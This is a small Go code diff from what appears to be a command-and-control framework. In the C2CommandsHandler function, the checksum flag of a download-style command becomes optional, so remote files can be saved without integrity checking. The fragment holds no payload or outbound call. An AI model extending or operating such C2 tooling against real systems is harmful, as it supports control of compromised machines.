@@ -345,7 +345,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		path := flags.StringP("path", "p", "", "Path to save")
 		checksum := flags.StringP("checksum", "c", "", "Checksum")
 		flags.Parse(cmdSlice[1:])
-		if *url == "" || *path == "" || *checksum == "" {
+		if *url == "" || *path == "" {
 			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			return
 		}
